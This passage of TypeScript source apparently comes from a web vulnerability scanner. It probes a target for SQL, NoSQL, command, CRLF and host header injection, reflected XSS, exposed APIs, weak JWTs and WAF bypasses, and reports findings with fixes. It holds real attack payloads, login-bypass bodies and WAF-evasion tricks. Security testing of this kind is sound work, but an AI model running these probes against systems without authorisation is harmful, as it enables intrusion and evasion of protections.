  /warning.*mysql.*query/i,
  /supplied argument is not a valid mysql/i,
  /pg_query\(\): query failed/i,
  /unterminated quoted string at or near/i,
  /pgsql:.*error/i,
  /unclosed quotation mark after the character string/i,
  /odbc.*sql server.*error/i,
  /ora-\d{5}/i,
  /quoted string not properly terminated/i,
  /microsoft.*ole db.*provider.*error/i,
  /80040e14/i,
  /sqlite3\.operationalerror/i,
  /sqlexception.*syntax error/i,
  /invalid sql statement/i,
  /syntax error.*near/i,
  /sql command not properly ended/i,
  /division by zero/i,
];

export async function checkWebApp(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing SQL injection (error-based and blind)...`);
  const sqliParams = [
    'id',
    'search',
    'q',
    'query',
    'page',
    'cat',
    'user',
    'item',
    'product',
    'order',
    'filter',
    'sort',
    'name',
  ];
  const sqliPayloads = ["'", '1 OR 1=1--', "1' OR '1'='1", "1'--", '1 AND 1=2--', "' OR 'x'='x"];
  const sqliBaseline = await probe(target.url, { timeoutMs: 8_000 });
  let sqliFound = false;

  for (const param of sqliParams.slice(0, 8)) {
    if (sqliFound) break;
    for (const payload of sqliPayloads.slice(0, 6)) {
      if (sqliFound) break;
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r) continue;
      const matched = SQLI_PATTERNS.find((p) => p.test(r.body));
      const baselineHasSameError = sqliBaseline
        ? SQLI_PATTERNS.some((p) => p.test(sqliBaseline.body))
        : false;
      const responseChanged =
        !sqliBaseline ||
        r.status !== sqliBaseline.status ||
        Math.abs(r.body.length - sqliBaseline.body.length) > 50;
      if (matched && responseChanged && !baselineHasSameError) {
        findings.push({
          title: 'SQL Injection — Database Error Leaked',
          severity: 'high',
          verification: 'suspected',
          confidence: 72,
          cvss: 7.5,
          cve: null,
          description: `Parameter '${param}' produced a database error absent from baseline.`,
          evidence: `BASELINE: ${target.url} → HTTP ${sqliBaseline?.status}\nPROBE: ${probeUrl} → HTTP ${r.status}\nPattern: ${matched}\nBody excerpt: ${r.body.slice(0, 400)}`,
          remediation: 'Use parameterised queries.',
        });
        sqliFound = true;
        break;
      }
    }
  }

  if (!sqliFound) {
    await onLog(`[${ts()}] Testing time-based blind SQL injection...`);
    const sleepSec = 5;
    const confirmSec = 3;
    const blindPayloads = [
      {
        payload: `1' AND SLEEP(${sleepSec})--`,
        db: 'MySQL',
        confirmPayload: `1' AND SLEEP(${confirmSec})--`,
      },
      {
        payload: `1; WAITFOR DELAY '0:0:${sleepSec}'--`,
        db: 'MSSQL',
        confirmPayload: `1; WAITFOR DELAY '0:0:${confirmSec}'--`,
      },
      {
        payload: `1' AND pg_sleep(${sleepSec})--`,
        db: 'PostgreSQL',
        confirmPayload: `1' AND pg_sleep(${confirmSec})--`,
      },
    ];
    for (const param of sqliParams.slice(0, 4)) {
      if (sqliFound) break;
      const baselineStart = Date.now();
      const bl = await probe(`${target.url.replace(/\/$/, '')}?${param}=1`, { timeoutMs: 8_000 });
      const baselineMs = Date.now() - baselineStart;
      if (!bl) continue;
      for (const { payload, db, confirmPayload } of blindPayloads) {
        const t0 = Date.now();
        const r = await probe(
          `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(payload)}`,
          { timeoutMs: (sleepSec + 6) * 1000 },
        );
        const elapsed = Date.now() - t0;
        if (r && elapsed > baselineMs + 4000 && elapsed >= sleepSec * 1000 - 500) {
          const t1 = Date.now();
          const confirmR = await probe(
            `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(confirmPayload)}`,
            { timeoutMs: (confirmSec + 6) * 1000 },
          );
          const confirmMs = Date.now() - t1;
          const confirmed = confirmR !== null && confirmMs > baselineMs + 2500;
          findings.push({
            title: `Time-Based Blind SQL Injection — ${db} ${confirmed ? 'Confirmed' : 'Signal'}`,
            severity: 'high',
            verification: confirmed ? 'verified' : 'suspected',
            confidence: confirmed ? 88 : 65,
            cvss: 8.1,
            cve: null,
            description: `Parameter '${param}' caused ${elapsed}ms delay (baseline: ${baselineMs}ms).${confirmed ? ' Confirmed with second payload.' : ''}`,
            evidence: `Baseline: ${baselineMs}ms\nPrimary: ${elapsed}ms\n${confirmed ? `Confirm: ${confirmMs}ms` : ''}`,
            remediation: 'Use parameterised queries.',
          });
          sqliFound = true;
          await onLog(
            `[${ts()}] ⚠ TIME-BASED BLIND SQLI ${confirmed ? 'CONFIRMED' : 'SIGNAL'}: ${db}`,
          );
          break;
        }
      }
    }
  }

  // Boolean-based blind
  if (!sqliFound) {
    await onLog(`[${ts()}] Testing boolean-based blind SQL injection...`);
    for (const param of sqliParams.slice(0, 5)) {
      if (sqliFound) break;
      const baseR = await probe(`${target.url}?${param}=1`, { timeoutMs: 8_000 });
      const trueR = await probe(`${target.url}?${param}=${encodeURIComponent('1 AND 1=1--')}`, {
        timeoutMs: 8_000,
      });
      const falseR = await probe(`${target.url}?${param}=${encodeURIComponent('1 AND 1=2--')}`, {
        timeoutMs: 8_000,
      });
      if (!baseR || !trueR || !falseR) continue;
      const pctDiff =
        trueR.body.length > 0
          ? Math.abs(trueR.body.length - falseR.body.length) / trueR.body.length
          : 0;
      const statusDiff = trueR.status !== falseR.status;
      if ((pctDiff > 0.2 || statusDiff) && Math.abs(trueR.body.length - baseR.body.length) < 50) {
        findings.push({
          title: 'Blind SQL Injection (Boolean-Based) — Response Differs',
          severity: 'high',
          verification: 'suspected',
          confidence: 72,
          cvss: 7.5,
          cve: null,
          description: `Parameter '${param}' shows significant difference between true/false conditions.`,
          evidence: `True: ${trueR.body.length} bytes, False: ${falseR.body.length} bytes, Diff: ${Math.round(pctDiff * 100)}%`,
          remediation: 'Use parameterised queries.',
        });
        sqliFound = true;
        await onLog(`[${ts()}] ⚠ BOOLEAN BLIND SQLI SIGNAL`);
      }
    }
  }

  // JSON body, cookies, custom headers injection (brief)
  if (!sqliFound) {
    await onLog(`[${ts()}] Testing SQLi in JSON body/cookies/headers...`);
    const sig = SQLI_PATTERNS;
    const r = await probe(target.url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ id: "' OR '1'='1", username: "' OR '1'='1" }),
      timeoutMs: 8_000,
    });
    if (r && sig.some((p) => p.test(r.body))) {
      findings.push({
        title: 'SQL Injection via JSON Request Body',
        severity: 'high',
        verification: 'suspected',
        confidence: 70,
        cvss: 7.5,
        cve: null,
        description: 'SQL error after JSON body injection.',
        evidence: `POST ${target.url}\nBody excerpt: ${r.body.slice(0, 300)}`,
        remediation: 'Use parameterised queries for all inputs.',
      });
      sqliFound = true;
    }
  }

  // XSS
  await onLog(`[${ts()}] Testing XSS reflection...`);
  const xssToken = Math.random().toString(36).slice(2, 10);
  const xssPayload = `<script>xss${xssToken}</script>`;
  const xssParams = [
    'q',
    'search',
    'name',
    'msg',
    'message',
    'text',
    'content',
    'input',
    'title',
    'value',
    'data',
    'error',
    'callback',
    'return',
    'next',
    'redirect',
  ];
  let xssFound = false;
  for (const param of xssParams.slice(0, 10)) {
    if (xssFound) break;
    for (const payload of [xssPayload, `"><img src=x onerror=alert(${xssToken})>`]) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (!r || !activeProbesAllowed()) break;
      const reflected =
        isContextualReflection(r.body, payload) || isContextualReflection(r.body, `xss${xssToken}`);
      if (reflected && /<script\b[^>]*>xss[a-z0-9]+<\/script>/i.test(r.body)) {
        findings.push({
          title: 'Reflected XSS — Script/Event Payload Returned Unescaped',
          severity: 'high',
          verification: 'suspected',
          confidence: 78,
          cvss: 7.4,
          cve: null,
          description: `Parameter '${param}' reflects user-supplied HTML/JS without encoding.`,
          evidence: `PROBE: ${probeUrl}\nPAYLOAD: ${param}=${payload}\nContent-Type: ${r.headers['content-type']}\nHTTP ${r.status}: payload reflected`,
          remediation: 'HTML-encode all user-controlled output.',
        });
        xssFound = true;
        await onLog(`[${ts()}] ⚠ REFLECTED XSS SIGNAL`);
        break;
      }
    }
  }

  // NoSQL
  await onLog(`[${ts()}] Testing NoSQL injection...`);
  const nosqlBaseline = await probe(target.url, { timeoutMs: 8_000 });
  const nosqlPayloads = [
    { body: '{"username":{"$gt":""},"password":{"$gt":""}}', ct: 'application/json' },
    { body: 'username[$gt]=&password[$gt]=', ct: 'application/x-www-form-urlencoded' },
  ];
  for (const ep of [`${target.url}api/login`, `${target.url}login`, `${target.url}auth`]) {
    for (const { body, ct } of nosqlPayloads) {
      const r = await probe(ep, {
        method: 'POST',
        headers: { 'Content-Type': ct },
        body,
        timeoutMs: 8_000,
      });
      if (!r) continue;
      const blStatus = nosqlBaseline?.status ?? 0;
      const bodyLower = r.body.toLowerCase();
      const successSignals = [
        'welcome',
        'dashboard',
        'logged in',
        'token',
        'access_token',
        'session',
        '"user":',
        '"id":',
        '"role":',
      ];
      const isSuccess = successSignals.some((s) => bodyLower.includes(s));
      if (
        r.status === 200 &&
        isSuccess &&
        (blStatus !== 200 || Math.abs(r.body.length - (nosqlBaseline?.body.length ?? 0)) > 100)
      ) {
        findings.push({
          title: 'NoSQL Injection — MongoDB Operator Authentication Bypass',
          severity: 'critical',
          verification: 'suspected',
          confidence: 75,
          cvss: 9.8,
          cve: null,
          description: `MongoDB operator injection produced success response at ${ep}.`,
          evidence: `POST ${ep}\nBody: ${body}\nHTTP ${r.status} — success signals in response\nResponse: ${r.body.slice(0, 300)}`,
          remediation: 'Sanitise input — strip $ operators.',
        });
        await onLog(`[${ts()}] ⚠ NOSQL INJECTION SIGNAL`);
        break;
      }
    }
  }

  // Command injection
  await onLog(`[${ts()}] Testing command injection...`);
  const cmdCanary = `sentinelx-cmd-${Math.random().toString(36).slice(2, 10)}`;
  const cmdPayloads = [
    `; printf ${cmdCanary}`,
    `| printf ${cmdCanary}`,
    `\`printf ${cmdCanary}\``,
    `$(printf ${cmdCanary})`,
  ];
  const cmdParams = [
    'cmd',
    'exec',
    'command',
    'run',
    'shell',
    'ping',
    'host',
    'ip',
    'target',
    'file',
    'path',
    'name',
    'url',
  ];
  for (const param of cmdParams.slice(0, 6)) {
    for (const payload of cmdPayloads.slice(0, 3)) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${encodeURIComponent(payload)}`;
      const r = await probe(probeUrl, { timeoutMs: 8_000 });
      if (r && r.body.includes(cmdCanary)) {
        findings.push({
          title: 'OS Command Injection — Canary Executed',
          severity: 'critical',
          verification: 'verified',
          confidence: 98,
          cvss: 10.0,
          cve: null,
          description: `The application executed a shell command via '${param}' parameter. Canary '${cmdCanary}' returned.`,
          evidence: `PROBE: ${probeUrl}\nPAYLOAD: ${param}=${payload}\nHTTP ${r.status} — canary found in response`,
          remediation: 'Never pass user input to shell execution functions.',
        });
        await onLog(`[${ts()}] ⚠ COMMAND INJECTION CONFIRMED`);
        break;
      }
    }
  }

  // Open redirect
  await onLog(`[${ts()}] Testing open redirect...`);
  const redirectMarker = 'redirect-test-sentinel-x';
  const redirectPayloads = [
    target.url + `?redirect=https://${redirectMarker}.example.com`,
    target.url + `?next=https://${redirectMarker}.example.com`,
    target.url + `?url=https://${redirectMarker}.example.com`,
  ];
  for (const probeUrl of redirectPayloads) {
    const r = await probe(probeUrl, { followRedirects: false, timeoutMs: 8_000 });
    if (r && [301, 302, 303, 307, 308].includes(r.status)) {
      const loc = r.headers['location'] ?? '';
      if (loc.includes(redirectMarker)) {
        findings.push({
          title: 'Open Redirect Vulnerability',
          severity: 'medium',
          cvss: 6.1,
          cve: null,
          description: 'The application redirects to attacker-controlled URLs.',
          evidence: `Probe URL: ${probeUrl}\nHTTP ${r.status} Location: ${loc}`,
          remediation: 'Validate redirect destinations against allowlist.',
        });
        break;
      }
    }
  }

  // HTTP methods enumeration
  await onLog(`[${ts()}] Enumerating HTTP methods...`);
  const optR = await probe(target.url, { method: 'OPTIONS', timeoutMs: 6_000 });
  if (optR) {
    const allow = optR.headers['allow'] ?? optR.headers['public'] ?? '';
    const dangerous = ['PUT', 'DELETE', 'TRACE', 'CONNECT'].filter((m) =>
      allow.toUpperCase().includes(m),
    );
    if (dangerous.length > 0) {
      findings.push({
        title: `Dangerous HTTP Methods Advertised: ${dangerous.join(', ')}`,
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: `OPTIONS response lists dangerous methods.`,
        evidence: `OPTIONS ${target.url} → HTTP ${optR.status}\nAllow: ${allow}`,
        remediation: 'Restrict to GET, POST, HEAD.',
      });
    }
  }

  // Error page disclosure
  await onLog(`[${ts()}] Checking error page disclosure...`);
  const errorR = await probe(target.url + '__nonexistent__sentinelx', { timeoutMs: 6_000 });
  if (errorR) {
    const body = errorR.body.toLowerCase();
    if (body.match(/traceback|stack trace|exception in|at \w+\.\w+\(|file ".*\.py"/i)) {
      findings.push({
        title: 'Stack Trace Disclosed in Error Response',
        severity: 'high',
        cvss: 7.5,
        cve: null,
        description: 'The application returns detailed stack traces.',
        evidence: `GET ${target.url}__nonexistent__sentinelx → HTTP ${errorR.status}\nStack trace detected`,
        remediation: 'Disable debug mode in production.',
      });
    }
  }

  // Directory listing
  const dirPaths = [
    '/images/',
    '/uploads/',
    '/static/',
    '/assets/',
    '/files/',
    '/backup/',
    '/css/',
    '/js/',
  ];
  for (const dirPath of dirPaths) {
    const dirUrl = target.url.replace(/\/$/, '') + dirPath;
    const r = await probe(dirUrl, { timeoutMs: 6_000 });
    if (
      r &&
      r.status === 200 &&
      (r.body.includes('Index of ') || r.body.includes('Directory listing'))
    ) {
      findings.push({
        title: `Directory Listing Enabled (${dirPath})`,
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: `Directory listing enabled for ${dirPath}.`,
        evidence: `GET ${dirUrl} → HTTP ${r.status}`,
        remediation: 'Disable directory listing.',
      });
      break;
    }
  }

  await onLog(`[${ts()}] Web app probes complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 12. API SURFACE DISCOVERY
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkApiSurface(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Probing API documentation and management endpoints...`);

  // GraphQL introspection
  for (const ep of ['/graphql', '/api/graphql', '/gql', '/query', '/v1/graphql']) {
    const url = target.url.replace(/\/$/, '') + ep;
    const r = await probe(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: '{ __schema { types { name } } }' }),
      timeoutMs: 8_000,
    });
    if (r?.status === 200 && r.body.includes('__schema')) {
      findings.push({
        title: 'GraphQL Introspection Enabled in Production',
        severity: 'high',
        cvss: 7.5,
        cve: null,
        description: 'GraphQL introspection is enabled, exposing the complete schema.',
        evidence: `POST ${url} → HTTP ${r.status}`,
        remediation: 'Disable introspection in production.',
      });
      break;
    }
  }

  // Swagger / OpenAPI
  for (const ep of [
    '/swagger',
    '/swagger-ui.html',
    '/api-docs',
    '/openapi.json',
    '/openapi.yaml',
    '/docs',
    '/redoc',
    '/v2/api-docs',
    '/v3/api-docs',
  ]) {
    const url = target.url.replace(/\/$/, '') + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (
      r?.status === 200 &&
      (r.body.toLowerCase().includes('swagger') ||
        r.body.toLowerCase().includes('openapi') ||
        r.body.includes('"paths"'))
    ) {
      findings.push({
        title: 'API Documentation (Swagger/OpenAPI) Publicly Exposed',
        severity: 'medium',
        cvss: 5.3,
        cve: null,
        description: 'API documentation is publicly accessible.',
        evidence: `GET ${url} → HTTP ${r.status}`,
        remediation: 'Restrict API docs to authenticated users.',
      });
      break;
    }
  }

  // Spring Boot Actuator
  for (const ep of ['/actuator/env', '/actuator/heapdump', '/actuator/beans', '/actuator']) {
    const url = target.url.replace(/\/$/, '') + ep;
    const r = await probe(url, { timeoutMs: 6_000 });
    if (
      r?.status === 200 &&
      (r.body.includes('"activeprofiles"') ||
        r.body.includes('"propertysources"') ||
        r.body.includes('"contexts"') ||
        r.body.includes('"beans"'))
    ) {
      findings.push({
        title: `Spring Boot Actuator Endpoint Exposed (${ep})`,
        severity: ep.includes('env') || ep.includes('heap') ? 'high' : 'medium',
        cvss: ep.includes('env') || ep.includes('heap') ? 9.8 : 7.5,
        cve: null,
        description: `Spring Boot Actuator ${ep} is publicly accessible.`,
        evidence: `GET ${url} → HTTP ${r.status}`,
        remediation: 'Restrict Actuator to management port and require authentication.',
      });
      break;
    }
  }

  // GraphQL query depth limit
  for (const ep of ['/graphql', '/api/graphql', '/gql']) {
    const url = target.url.replace(/\/$/, '') + ep;
    const deepQuery = `{ a { b { c { d { e { f { g { h { i { j { k { l { m { n { o { __typename } } } } } } } } } } } } } } } }`;
    const r = await probe(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: deepQuery }),
      timeoutMs: 10_000,
    });
    if (
      r?.status === 200 &&
      !r.body.toLowerCase().includes('query is too deep') &&
      !r.body.includes('depth limit') &&
      !r.body.includes('maxDepth')
    ) {
      findings.push({
        title: 'GraphQL Query Depth Limit Not Enforced',
        severity: 'medium',
        cvss: 5.9,
        cve: null,
        description: 'A deeply nested GraphQL query (15 levels) was accepted.',
        evidence: `POST ${url}\nDepth: 15 levels\nHTTP ${r.status}`,
        remediation: 'Implement query depth limits.',
      });
      break;
    }
  }

  await onLog(`[${ts()}] API surface scan complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// WAF DETECTION & BYPASS
// ═══════════════════════════════════════════════════════════════════════════════

const WAF_SIGNATURES: Record<string, { headers: string[]; body: string[]; cookies: string[] }> = {
  Cloudflare: {
    headers: ['cf-ray', 'cf-cache-status', 'cf-worker', 'cf-request-id'],
    body: ['cloudflare', 'attention required! | cloudflare'],
    cookies: ['__cfduid', 'cf_clearance'],
  },
  'AWS WAF': {
    headers: ['x-amzn-requestid', 'x-amz-cf-id', 'x-amz-apigw-id'],
    body: [],
    cookies: [],
  },
  Akamai: {
    headers: ['akamai-origin-hop', 'x-akamai-transformed'],
    body: ['reference #18.'],
    cookies: ['ak_bmsc'],
  },
  Sucuri: {
    headers: ['x-sucuri-id', 'x-sucuri-cache'],
    body: ['sucuri website firewall'],
    cookies: [],
  },
  'Imperva/Incapsula': {
    headers: ['x-iinfo', 'x-cdn'],
    body: ['incapsula incident id'],
    cookies: ['incap_ses', 'visid_incap'],
  },
  'F5 BIG-IP ASM': {
    headers: ['x-cnection', 'x-wa-info'],
    body: ['the requested url was rejected'],
    cookies: ['TS', 'bigipserver'],
  },
  Barracuda: { headers: [], body: ['barracuda networks'], cookies: ['barra_counter_session'] },
  ModSecurity: {
    headers: ['x-mod-security-message'],
    body: ['mod_security', 'not acceptable'],
    cookies: [],
  },
  Fastly: { headers: ['x-fastly-request-id', 'fastly-debug-digest'], body: [], cookies: [] },
  Varnish: { headers: ['x-varnish'], body: [], cookies: [] },
};

async function checkWafAndBypass(
  target: Target,
  onLog: LogFn,
  allowBypass = false,
): Promise<{ findings: RealFinding[]; wafName: string | null }> {
  const findings: RealFinding[] = [];
  await onLog(
    `[${ts()}] Detecting WAF/CDN${allowBypass ? ' and testing bypass techniques' : ' passively'}...`,
  );
  const r = await probe(target.url, { timeoutMs: 12_000 });
  if (!r) return { findings, wafName: null };
  if (r.wafChallenge || isWafChallengeDetected()) {
    await onLog(`[${ts()}] WAF challenge response received; bypass probes skipped.`);
    return { findings, wafName: 'Cloudflare' };
  }

  let detectedWaf: string | null = null;
  const allHeaders = JSON.stringify(r.headers).toLowerCase();
  const allCookies = (r.headers['set-cookie'] ?? '').toLowerCase();
  const bodyLower = r.body.toLowerCase();
  for (const [waf, sigs] of Object.entries(WAF_SIGNATURES)) {
    const headerMatch = sigs.headers.some((h) => allHeaders.includes(h.toLowerCase()));
    const bodyMatch = sigs.body.some((b) => bodyLower.includes(b.toLowerCase()));
    const cookieMatch = sigs.cookies.some((c) => allCookies.includes(c.toLowerCase()));
    if (headerMatch || bodyMatch || cookieMatch) {
      detectedWaf = waf;
      break;
    }
  }

  if (detectedWaf) {
    await onLog(`[${ts()}] WAF/CDN detected: ${detectedWaf}`);
    findings.push({
      title: `WAF/CDN Detected: ${detectedWaf}`,
      severity: 'low',
      verification: 'informational',
      confidence: 92,
      cvss: 0,
      cve: null,
      description: `A Web Application Firewall (${detectedWaf}) is in front of this target.`,
      evidence: `WAF: ${detectedWaf}`,
      remediation: 'Keep the underlying application patched.',
    });

    if (!allowBypass) {
      await onLog(
        `[${ts()}] Passive WAF detection complete — bypass and origin discovery disabled.`,
      );
      return { findings, wafName: detectedWaf };
    }

    // IP-spoofing bypass
    await onLog(`[${ts()}] Testing WAF bypass via IP-spoofing headers...`);
    const bypassHeaderSets: Record<string, string>[] = [
      { 'X-Forwarded-For': '127.0.0.1' },
      { 'X-Real-IP': '127.0.0.1' },
      { 'X-Originating-IP': '127.0.0.1' },
      { 'X-Client-IP': '127.0.0.1' },
      { 'True-Client-IP': '127.0.0.1' },
      { 'CF-Connecting-IP': '127.0.0.1' },
    ];
    for (const hdrs of bypassHeaderSets) {
      const bypassR = await probe(target.url, { headers: hdrs, timeoutMs: 10_000 });
      if (bypassR && Math.abs(bypassR.body.length - r.body.length) > 300) {
        const hdrKey = Object.keys(hdrs)[0]!;
        findings.push({
          title: `WAF Bypass Signal: IP Header Spoofing (${hdrKey})`,
          severity: 'high',
          verification: 'suspected',
          confidence: 72,
          cvss: 7.5,
          cve: null,
          description: `Adding ${hdrKey}: ${Object.values(hdrs)[0]} produced a significantly different response.`,
          evidence: `Baseline: ${r.body.length} bytes\nWith ${hdrKey}: ${bypassR.body.length} bytes`,
          remediation: 'Only trust IP override headers from verified internal proxy IP ranges.',
        });
        await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: ${hdrKey}`);
        break;
      }
    }

    // Googlebot UA bypass
    const botR = await probe(target.url, {
      headers: { 'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)' },
      timeoutMs: 10_000,
    });
    if (botR && Math.abs(botR.body.length - r.body.length) > 500) {
      findings.push({
        title: 'WAF Bypass Signal: Googlebot User-Agent Treated Differently',
        severity: 'medium',
        verification: 'suspected',
        confidence: 60,
        cvss: 5.3,
        cve: null,
        description: 'Server returns different response for Googlebot.',
        evidence: `Normal: ${r.body.length} bytes\nGooglebot: ${botR.body.length} bytes`,
        remediation: 'Do not apply different security rules based on User-Agent.',
      });
      await onLog(`[${ts()}] ⚠ WAF BYPASS SIGNAL: Googlebot UA`);
    }

    // Direct origin IP access
    await onLog(`[${ts()}] Checking for direct origin IP exposure...`);
    try {
      const ips = await digQuery(target.hostname, 'A');
      for (const ip of ips.slice(0, 2)) {
        const originR = await probe(`http://${ip}/`, {
          headers: { Host: target.hostname },
          timeoutMs: 8_000,
          followRedirects: false,
        });
        if (originR && originR.status >= 200 && originR.status < 400) {
          const originHeaders = JSON.stringify(originR.headers).toLowerCase();
          const hasWafHeader =
            WAF_SIGNATURES[detectedWaf]?.headers.some((h) => originHeaders.includes(h)) ?? false;
          if (!hasWafHeader) {
            findings.push({
              title: `Origin IP Bypasses ${detectedWaf} WAF — Direct Access Confirmed (${ip})`,
              severity: 'critical',
              verification: 'verified',
              confidence: 92,
              cvss: 9.8,
              cve: null,
              description: `The origin server at ${ip} responds directly over HTTP without passing through ${detectedWaf}.`,
              evidence: `WAF-protected host: ${target.hostname}\nDirect IP: ${ip}\nHTTP GET http://${ip}/ → HTTP ${originR.status} without WAF headers`,
              remediation: `Firewall the origin to accept connections only from ${detectedWaf}'s IP ranges.`,
            });
            await onLog(`[${ts()}] ⚠ ORIGIN IP EXPOSED: ${ip} reachable without ${detectedWaf}`);
          }
        }
      }
    } catch {}

    // Encoding bypass test
    const pathR = await probe(`${target.url.replace(/\/$/, '')}/..%2f`, { timeoutMs: 6_000 });
    const dotR = await probe(`${target.url.replace(/\/$/, '')}/.%2e/`, { timeoutMs: 6_000 });
    if ((pathR && pathR.status === 200) || (dotR && dotR.status === 200)) {
      findings.push({
        title: 'WAF Path Normalisation Bypass (URL-Encoded Traversal)',
        severity: 'medium',
        verification: 'suspected',
        confidence: 60,
        cvss: 5.3,
        cve: null,
        description:
          'URL-encoded path segments returned 200, suggesting WAF does not normalise paths.',
        evidence: `GET ${target.url}..%2f → HTTP ${pathR?.status}\nGET ${target.url}.%2e/ → HTTP ${dotR?.status}`,
        remediation: 'Configure WAF to normalise URLs.',
      });
    }
  } else {
    await onLog(`[${ts()}] No WAF/CDN signature detected — unprotected origin`);
  }

  return { findings, wafName: detectedWaf };
}

// ═══════════════════════════════════════════════════════════════════════════════
// HOST HEADER INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkHostHeaderInjection(
  target: Target,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing host header injection...`);
  const injectedHost = 'evil-sentinelx-bypass.attacker.example';
  for (const [hdrs, label] of [
    [{ Host: injectedHost }, 'Host'],
    [{ 'X-Forwarded-Host': injectedHost }, 'X-Forwarded-Host'],
    [{ 'X-Host': injectedHost }, 'X-Host'],
    [{ 'X-Forwarded-Server': injectedHost }, 'X-Forwarded-Server'],
  ] as [Record<string, string>, string][]) {
    const r = await probe(target.url, { headers: hdrs, followRedirects: false, timeoutMs: 10_000 });
    if (
      r &&
      (r.body.includes(injectedHost) || (r.headers['location'] ?? '').includes(injectedHost))
    ) {
      findings.push({
        title: `Host Header Injection via ${label}`,
        severity: 'high',
        verification: 'verified',
        confidence: 92,
        cvss: 7.5,
        cve: null,
        description: `The ${label} header value is reflected in the response.`,
        evidence: `GET ${target.url} with ${label}: ${injectedHost}\nHTTP ${r.status}\nInjected host reflected`,
        remediation: 'Build absolute URLs from server-side configuration.',
      });
      await onLog(`[${ts()}] ⚠ HOST HEADER INJECTION via ${label}`);
      return findings;
    }
  }
  await onLog(`[${ts()}] Host header injection: no reflection confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// CRLF INJECTION
// ═══════════════════════════════════════════════════════════════════════════════

export async function checkCrlfInjection(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  await onLog(`[${ts()}] Testing CRLF injection...`);
  const crlfPayloads = [
    '%0d%0aX-SentinelX-Injected:%20crlf-confirmed',
    '%0aX-SentinelX-Injected:%20crlf-confirmed',
  ];
  const crlfParams = [
    'url',
    'next',
    'redirect',
    'target',
    'return',
    'page',
    'path',
    'q',
    'lang',
    'ref',
    'location',
  ];
  for (const param of crlfParams.slice(0, 6)) {
    for (const payload of crlfPayloads) {
      const probeUrl = `${target.url.replace(/\/$/, '')}?${param}=${payload}`;
      const r = await probe(probeUrl, { followRedirects: false, timeoutMs: 8_000 });
      if (r && r.headers['x-sentinelx-injected'] === 'crlf-confirmed') {
        findings.push({
          title: 'CRLF Injection — HTTP Response Splitting Confirmed',
          severity: 'high',
          verification: 'verified',
          confidence: 98,
          cvss: 7.5,
          cve: null,
          description: `CRLF injected via '${param}'.`,
          evidence: `PROBE: ${probeUrl}\nPARAM: ${param}=${payload}\nHTTP ${r.status}\nInjected header appeared`,
          remediation: 'Strip CR/LF from user input included in headers.',
        });
        await onLog(`[${ts()}] ⚠ CRLF INJECTION CONFIRMED via param '${param}'`);
        return findings;
      }
    }
  }
  await onLog(`[${ts()}] CRLF injection: no confirmed injection`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// JWT WEAKNESS DETECTION (incl. advanced attacks)
// ═══════════════════════════════════════════════════════════════════════════════

function decodeJwtPart(b64url: string): Record<string, unknown> | null {
  try {
    const padded = b64url + '='.repeat((4 - (b64url.length % 4)) % 4);
    return JSON.parse(Buffer.from(padded, 'base64url').toString('utf8'));
  } catch {
    return null;
  }
}

const JWT_WEAK_SECRETS = [
  'secret',
  'password',
  '1234',
  '12345',
  '123456',
  'changeme',
  'jwt',
  'mysecret',
  'secretkey',
  'app_secret',
  'token',
  'jwttoken',
  'jwtSecret',
  'super_secret',
  'private',
  'key',
  'apikey',
  'admin',
  'letmein',
  'qwerty',
  'abc123',
  'test',
  'dev',
  'production',
];

async function checkJwtAdvanced(
  target: Target,
  token: string,
  parts: string[],
  header: Record<string, unknown>,
  ep: string,
  onLog: LogFn,
): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const alg = String(header.alg ?? '').toUpperCase();

  // Empty signature / stripping
  for (const [testToken, label] of [
    [`${parts[0]}.${parts[1]}.`, 'empty signature'],
    [`${parts[0]}.${parts[1]}.null`, 'null signature'],
  ] as const) {
    const r = await probe(target.url, {
      headers: { Authorization: `Bearer ${testToken}` },
      timeoutMs: 8_000,
      skipAuth: true,
    });
    if (r && r.status === 200) {
      findings.push({
        title: `JWT ${label.charAt(0).toUpperCase() + label.slice(1)} Accepted`,
        severity: 'critical',
        verification: 'suspected',
        confidence: 72,
        cvss: 9.8,
        cve: null,
        description: `Server accepted a JWT with ${label}.`,
        evidence: `Token with ${label} sent to: ${target.url}\nHTTP ${r.status}`,
        remediation: 'Enforce signature validation.',
      });
      await onLog(`[${ts()}] ⚠ JWT ${label.toUpperCase()} ACCEPTED`);
      break;
    }
  }

  // Key confusion (RS256 → HS256)
  if (alg === 'RS256' || alg === 'RS384' || alg === 'RS512') {
    for (const jwksUrl of [
      `${target.url}.well-known/jwks.json`,
      `${target.url}api/.well-known/jwks.json`,
      `${target.url}auth/jwks`,
    ]) {
      const jwksR = await probe(jwksUrl, { timeoutMs: 6_000 });
